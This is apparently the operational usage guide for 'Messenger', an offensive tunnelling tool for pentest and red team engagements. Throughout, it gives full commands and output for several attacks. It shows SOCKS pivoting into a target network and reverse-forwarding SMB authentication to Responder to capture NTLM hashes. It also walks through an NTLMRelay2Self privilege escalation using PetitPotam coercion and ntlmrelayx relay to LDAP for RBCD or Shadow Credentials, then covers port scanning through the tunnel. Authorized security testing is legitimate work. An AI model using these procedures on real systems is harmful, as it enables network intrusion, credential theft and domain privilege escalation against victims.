# Operational Usage

One goal of Messenger is to make it easy for operators to perform specific attacks common to standard pentest and red team scenarios while also staying flexible enough to perform attacks we haven't thought about yet. Below you'll find the most common use-cases for Messenger and step-by-step instructions for how to perform these attacks.

### SOCKS Proxy

The most common use-case for Messenger is setting up an ingress SOCKS proxy, allowing network traffic from external tools to be tunneled into a target network.

1. After a new messenger checks in, interact with it by entering the messenger ID:
```
[+] WebSocket Messenger `PWnauryxxD` is now connected.
(messenger)~# PWnauryxxD
(PWnauryxxD)~#
```
2. Next, use the `socks` command with a specified port to open a SOCKS proxy.
```
(PWnauryxxD)~# socks 1080
[*] Attempting to forward (127.0.0.1:1080) -> (*:*).
[+] Messenger PWnauryxxD now forwarding (127.0.0.1:1080) -> (*:*).
(PWnauryxxD)~#
```
3. Use a proxy-capable tool, or a proxifier tool, such as `proxychains`, to send TCP traffic through the SOCKS proxy. An example `proxychains` config for a Messenger SOCKS proxy on port 1080 is provided here:
```
[ProxyList]
socks5  127.0.0.1 1080
```
4. Hint: to check to make sure your SOCKS tunnel is working, try using `curl` on `ifconfig.io` to check which IP address you are coming from.
```
$ proxychains curl ifconfig.io
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  ifconfig.io:80  ...  OK
68.12.211.24
```

### Reverse Port Forwards

Messenger supports reverse port forwards. A service hosted externally can be bridged in and hosted on the same computer as the Messenger client. Although reverse forwards do not require root/administrator access, firewall manipulation and binding to privileged ports typically do. A common example of this functionality is forwarding [Responder](https://github.com/lgandx/Responder)'s SMB capture server onto a compromised Windows host.
1. By default, TCP/445 is in use by the `System` process (PID: 4). In order to start a reverse forwarder on port 445, we first need to [unbind the server service](https://posts.specterops.io/relay-your-heart-away-an-opsec-conscious-approach-to-445-takeover-1c9b4666c8ac). This will require administrator privileges.
```powershell
Set-Service -ServiceName LanmanServer -StartupType Disabled
Stop-Service -ServiceName LanmanServer
Stop-Service -ServiceName srv2
Stop-Service -ServiceName srvnet
```
2. Verify the SMB service is no longer listening
```
> netstat -ano | findstr 445
```
3. Next, start a Messenger client with a remote forward for TCP port 445. This will start a server bound to all interfaces (0.0.0.0) on TCP/445 on the Messenger client host. Traffic from this forwarder will be sent to 127.0.0.1:445 on the Messenger server after the forward is approved.
```
> python3.exe messenger-client 192.168.1.100:8080 ZDXgoqyVXqDpJyBMJt 0.0.0.0:445:127.0.0.1:445
```
4. After the Messenger client connects, interact with the messenger and enable the remote forward from the server side. If not, the following message will appear in the Messenger server console:
```
[!] Messenger wtwNJsfYRJ has no Remote Port Forwarder configured for 127.0.0.1:445, denying forward!
```

```
[+] WebSocket Messenger `wtwNJsfYRJ` is now connected.
(messenger)~# wtwNJsfYRJ
(wtwNJsfYRJ)~# remote 445
[*] Messenger KacLHgjlol now forwarding (*:*) -> (127.0.0.1:445).
```
5. Start Responder and bind to the loopback interface on the Messenger server:
```
# python3 Responder.py -I lo
```
6. Use a coercion technique or other method to force authentication back to the Messenger client host. As a simple proof of concept, open an Explorer window and enter `\\127.0.0.1\C$` in the folder path. If done correctly, Responder should have captured the forwarded authentication.
```
[SMB] NTLMv1-SSP Client   : 127.0.0.1
[SMB] NTLMv1-SSP Username : BORGAR\kclark
[SMB] NTLMv1-SSP Hash     : kclark::BORGAR:DA0D86D275019B9300000000000000000000000000000000:4E975DA5F409E4475F57BFCC28BBB3BF32F7FE6C29603B08:b26d7ecc63011faa
```

### Messenger Chaining

Messenger does not have a native method to chain multiple messenger clients to each other, but reverse port forwarding makes it possible to forward the messenger server through a client.
```
+-----------+        +-----------+        +-----------+
| Messenger |        | Messenger |        | Messenger |
| Server    | <----- | Client A  | <----- | Client B  |
|           |        |           |        |           |
+-----------+        +-----------+        +-----------+
```
1. Set up a reverse port forward on Messenger client A to forward the server's port. In this example, the Messenger server is listening on TCP/8080 and will be reverse forwarded to TCP/8888 on the Messenger client.
```
> python3.exe messenger-client 192.168.1.100:8080 ZDXgoqyVXqDpJyBMJt 0.0.0.0:8888:127.0.0.1:8080
```
2. Start a second Messenger client (Messenger B) to link up with the now forwarded listener on the Messenger A host.
```
> python3.exe messenger-client 192.168.1.20:8888 ZDXgoqyVXqDpJyBMJt
```
3. A new messenger should have checked in. This new Messenger can be interacted with like normal.
```
[+] WebSocket Messenger `SiHSttBrWG` is now connected.
(LDbNqWdgsk)~# messengers
                                  Messengers
   Identifier      Transport    Alive    Forwarders      Sent       Received
---------------- ------------- ------- -------------- ----------- ------------
  > LDbNqWdgsk     WebSocket     Yes     vHcsbeQnWM     4.57 KB     22.48 KB
   SiHSttBrWG      WebSocket     Yes        •••           0 B         0 B

(LDbNqWdgsk)~# forwarders
                                                   Forwarders
          Type              Identifier   Clients Listening Host Listening Port Destination Host Destination Port
------------------------- -------------- ------- -------------- -------------- ---------------- ----------------
  Remote Port Forwarder     vHcsbeQnWM      1          *              *           127.0.0.1           8080
```

### NTLMRelay2Self

[NTLMRelay2Self](https://github.com/med0x2e/NTLMRelay2Self) is a type of privilege escalation attack where an attacker performs authentication coercion and LDAP relay attacks in order to gain SYSTEM-level access to the compromised system. This attack requires the following:
- Low-privileged access on a domain-joined Windows workstation
- Ability to trigger-start the WebClient service on the workstation
- Ability to coerce authentication (via EFS, spooler, etc.) on the workstation
- LDAP signing or LDAPS channel binding not enforced on a DC
- Ability to perform computer-takeover primitive (RBCD or Shadow Credentials)

1. Start a Messenger client up with a reverse port forward for a high port. In this example, we will be using TCP/8888, however, any other high port not already in use should work. Since this is NTLMRelay2**self**, we only need to bind the reverse port forward to 127.0.0.1 on the Messenger client side.
```
> python3.exe messenger-client 192.168.1.100:8080 ZDXgoqyVXqDpJyBMJt 127.0.0.1:8888:127.0.0.1:8888
```
2. Start up a SOCKS proxy on the Messenger server for the new Messenger client that checked in:
```
[+] WebSocket Messenger `PWnauryxxD` is now connected.
(messenger)~# PWnauryxxD
(PWnauryxxD)~# socks 1080
[*] Attempting to forward (127.0.0.1:1080) -> (*:*).
[+] Messenger PWnauryxxD now forwarding (127.0.0.1:1080) -> (*:*).
(PWnauryxxD)~#
```
3. Test to make sure LDAP signing or LDAPS channel binding is disabled on a Domain Controller. NetExec ldap-checker module or [LdapRelayScan](https://github.com/zyn3rgy/LdapRelayScan) can be used.
```
$ proxychains netexec ldap dc.borgar.local -u lowbie -p P@ssw0rd -M ldap-checker
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc.borgar.local:389  ...  OK
LDAP        224.0.0.1       389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:borgar.local)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc.borgar.local:389  ...  OK
LDAP        224.0.0.1       389    DC               [+] borgar.local\lowbie:P@ssw0rd 
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc.borgar.local:389  ...  OK
LDAP-CHE... 224.0.0.1       389    DC               LDAP signing NOT enforced
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc.borgar.local:636  ...  OK
LDAP-CHE... 224.0.0.1       389    DC               LDAPS channel binding is set to: Never
```

4. Set up the reverse port forward: 127.0.0.1:8888 on the Messenger client host -> 127.0.0.1:8888 on the Messenger server
```
(PWnauryxxD)~# remote 127.0.0.1:8888
[*] Messenger PWnauryxxD now forwarding (*:*) -> (127.0.0.1:8888).
```
5. Check the status of the WebClient service. By default it will be installed on Windows workstations, but not started.
```powershell
Get-Service -ServiceName WebClient

Status   Name               DisplayName
------   ----               -----------
Stopped  WebClient          WebClient
```
6. By default, the WebClient service has a Startup Type of Manual (Trigger), which means with the right actions, a low-privilege user can start the service. We can either upload a [.searchConnector-ms file](https://gitlab.com/KevinJClark/ops-scripts/-/tree/main/start_webclient_searchConnector-ms) and view it in an explorer window, or use a [C# script](https://gist.github.com/klezVirus/af004842a73779e1d03d47e041115797) or a [Beacon Object File](https://github.com/outflanknl/C2-Tool-Collection/blob/main/BOF/StartWebClient/SOURCE/StartWebClient.c) to start it.
```
> StartWebClient.exe
[+] WebClient Service started successfully
```
```powershell
get-service -ServiceName WebClient

Status   Name               DisplayName
------   ----               -----------
Running  WebClient          WebClient
```
7. Start an NTLM HTTP capture/relay server on TCP/8888 on the Messenger server host. Set it up for either Shadow Credentials or RBCD relay. Relay to LDAP or LDAPS on a DC without signing/channel binding required. Set it up to use the SOCKS proxy for outgoing traffic.

RBCD Method:
```
# proxychains ntlmrelayx.py -t ldap://dc.borgar.local --no-smb-server --http-port 8888 --no-acl --no-dump --no-da --no-validate-privs --delegate-access
```

Shadow Credentials Method:
```
# proxychains ntlmrelayx.py -t ldap://dc.borgar.local --no-smb-server --http-port 8888 --no-acl --no-dump --no-da --no-validate-privs --shadow-credentials --pfx-pass ''
```
8. Perform authentication coercion using [Printerbug](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py), [PetitPotam](https://github.com/topotam/PetitPotam), or [Coercer](https://github.com/p0dalirius/Coercer). Specify a "dotless hostname" (a hostname without dots and not an IP address) for the capture server, with `@<port>/something` afterwards. The dotless hostname can either be the computer's NetBIOS name or just the word `localhost`. This command should also go through the SOCKS proxy.
```
$ proxychains python3 PetitPotam.py -u lowbie -p P@ssw0rd -d borgar.local localhost@8888/something 127.0.0.1
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14

                                                                                               
              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN



Trying pipe lsarpc
[-] Connecting to ncacn_np:127.0.0.1[\PIPE\lsarpc]
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:445  ...  OK
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```
9. If everything worked correctly, `ntlmrelayx.py` should have caught WebDAV (HTTP) authentication from the coerced authentication attack. In `ntlmrelayx.py`, output indicating successful modification of RBCD permissions or Shadow Credentials should display.

RBCD Method:
```
[*] Servers started, waiting for connections
[*] HTTPD(8888): Connection from 127.0.0.1 controlled, attacking target ldap://dc.borgar.local
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc.borgar.local:389  ...  OK
[*] HTTPD(8888): Authenticating against ldap://dc.borgar.local as BORGAR/WS01$ SUCCEED
[*] Assuming relayed user has privileges to escalate a user via ACL attack
[*] Adding a machine account to the domain requires TLS but ldap:// scheme provided. Switching target to LDAPS via StartTLS
[*] Attempting to create computer in: CN=Computers,DC=borgar,DC=local
[*] Adding new computer with username: NUUQERGH$ and password: MWw4SBXWXr(hc*n result: OK
[*] Delegation rights modified succesfully!
[*] NUUQERGH$ can now impersonate users on WS01$ via S4U2Proxy
```
Shadow Credentials Method:
```
[*] Servers started, waiting for connections
[*] HTTPD(8888): Connection from 127.0.0.1 controlled, attacking target ldap://dc.borgar.local
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc.borgar.local:389  ...  OK
[*] HTTPD(8888): Authenticating against ldap://dc.borgar.local as BORGAR/WS01$ SUCCEED
[*] Assuming relayed user has privileges to escalate a user via ACL attack
[*] Searching for the target account
[*] Target user found: CN=WS01,CN=Computers,DC=borgar,DC=local
[*] Generating certificate
[*] HTTPD(8888): Connection from 127.0.0.1 controlled, but there are no more targets left!
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 3e698916-c5d1-0022-ced9-241b5e4c557e
[*] Updating the msDS-KeyCredentialLink attribute of WS01$
[*] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Saved PFX (#PKCS12) certificate & key at path: AdK8BkC5.pfx
[*] Must be used with password: 
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
[*] Run the following command to obtain a TGT
[*] python3 PKINITtools/gettgtpkinit.py -cert-pfx AdK8BkC5.pfx -pfx-pass  borgar.local/WS01$ AdK8BkC5.ccache
```
10. After this, an administrative Kerberos TGT can be generated for the victim workstation via `getST.py` for [the RBCD method](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/resource-based-constrained-delegation.html), or `certipy`+`ticketer.py` for [Shadow Credentials](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials).

Below is a visual diagram of what the whole attack flow looks like:
```
+------------------------------+        +------------------------------+        +------------------------------+
|    Attacker Machine          |        |      Victim Workstation      |        |     Domain Controller        |
|                              |        |                              |        |                              |
|  +------------------------+  |        |  +------------------------+  |        |  +------------------------+  |
|  |  Messenger Server      |<============>|    Messenger Client    |<============>|      LDAP Server       |  |
|  |  and NTLMRelayX        |  |        |  +------------------------+  |        |  +------------------------+  |
|  +------------------------+  |        | 1. Coerce auth via PetitPotam|        |  5. LDAP relay successful    |
| 4. Relay NTLM WebDAV (HTTP)  |        | 2. Send WebDAV auth to self  |        |  6. Set up RBCD or Shadow    |
|    auth to Domain Controller |        | 3. Redirect WebDAV auth to   |        |     Credentials              |
|    over SOCKS proxy          |        |    attacker via rportfwd     |        |                              |
+------------------------------+        +------------------------------+        +------------------------------+

```

### Port Scanning

Messenger is robust enough to handle port scans through the SOCKS proxy. Generally, port scans take longer through the context of a SOCKS proxy, and should be limited to small groups of hosts and ports. Using `nmap`, a group of hosts or range can be scanned. A few caveats apply:
- Use the `-sT` flag in `nmap`, since the SOCKS proxy is unable to open raw sockets (which the default scan method requires in `nmap`). This feature turns off SYN scanning, and uses full TCP connect scans, which the SOCKS proxy can handle.
- Use the `-Pn` flag to avoid scanning additional ports for live host discovery. Perform live host discovery manually. Reduce the number of ports you are scanning!
- Adjustments for the default connect timeouts can be reduced. Note that these timeout values may need to be increased on higher-latency networks. I recommend the following adjustments for a proxychains-ng `/etc/proxychains.conf` file:
```
dynamic_chain
proxy_dns 
tcp_connect_time_out 3000
tcp_read_time_out 5000
```
A final Nmap command might look like the following:
```
$ proxychains nmap -sT -Pn -p445 192.168.1.0/24
```
